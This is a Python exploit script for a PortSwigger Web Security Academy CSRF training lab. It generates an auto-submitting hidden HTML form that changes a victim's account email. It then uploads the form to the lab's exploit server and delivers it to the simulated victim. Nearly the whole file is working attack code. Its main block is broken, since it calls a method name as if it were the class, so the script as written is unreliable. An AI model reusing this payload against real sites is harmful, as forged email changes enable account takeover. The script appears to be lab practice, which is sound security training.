"""
Exploit for lab:
    CSRF vulnerability with no defenses
    https://portswigger.net/web-security/csrf/lab-no-defenses

By Xqweak.
"""
import requests
import argparse
import urllib


class CSRF_Lab_Exploit:
    def __init__(self,url,exploit_server):
        self.url = url
        self.exploit_server = exploit_server

    def generate_CSRF_POC(self):
        poc = f'''
<html>
  <body>
    <form action="{self.url}/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="lol&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
        '''
        return poc

    def post_CSRF(self):
        payload = self.generate_CSRF_POC()
        data = {
         "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
          "responseBody": payload,
          "urlIsHttps": "on",
          "formAction": "STORE",
          "responseFile": "/exploit"
        }
        r = requests.post(self.exploit_server , data)
        data = {
         "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
          "responseBody": payload,
          "urlIsHttps": "on",
          "formAction": "DELIVER_TO_VICTIM",
          "responseFile": "/exploit"
        }
        r = requests.post(self.exploit_server , data)
        print(r)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' , '--url' , required=True, help="Portswigger's lab url")
    parser.add_argument('-e' , '--exploit_server' , required=True, help="Portswigger exploit server for the lab.")
    args = parser.parse_args()
    # Run the exploit
    lab =  generate_CSRF_POC(args.url , args.exploit_server)
    lab.post_CSRF()
